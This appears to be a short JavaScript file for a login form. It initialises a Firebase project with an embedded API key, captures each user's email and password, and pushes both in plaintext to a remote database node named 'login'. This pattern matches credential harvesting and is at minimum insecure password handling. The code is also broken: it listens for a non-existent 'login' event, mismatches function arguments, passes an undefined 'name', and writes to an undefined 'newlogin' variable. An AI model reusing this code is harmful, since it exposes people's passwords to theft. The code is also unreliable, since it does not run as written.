const firebaseConfig = {
    apiKey: "AIzaSyCLR9V3pFEyxbdM284e2Uf75VMld4PzZGU",
    authDomain: "login-54b5b.firebaseapp.com",
    projectId: "login-54b5b",
    storageBucket: "login-54b5b.appspot.com",
    messagingSenderId: "806146168865",
    appId: "1:806146168865:web:383f164eb8b043b6802b60",
    measurementId: "G-WCL16QGBQT"
  };
    

    // Initialize Firebase
    firebase.initializeApp(firebaseConfig);
    var loginDB = firebase.database().ref("login");

document.getElementById("login").addEventListener("login", submitForm);

function submitForm(e) {
  e.preventDefault();
  var email = getElementVal("email");
  var password = getElementVal("password");

  saveMessages(name, email, password);

  //   enable alert
  document.querySelector(".alert").style.display = "block";

  //   remove the alert
  setTimeout(() => {
    document.querySelector(".alert").style.display = "none";
  }, 3000);

  //   reset the form
  document.getElementById("login").reset();
}

const saveMessages = (email, password) => {
  var login = loginDB.push();

  newlogin.set({
    email: email,
    password: password,
  });
};

const getElementVal = (id) => {
  return document.getElementById(id).value;
};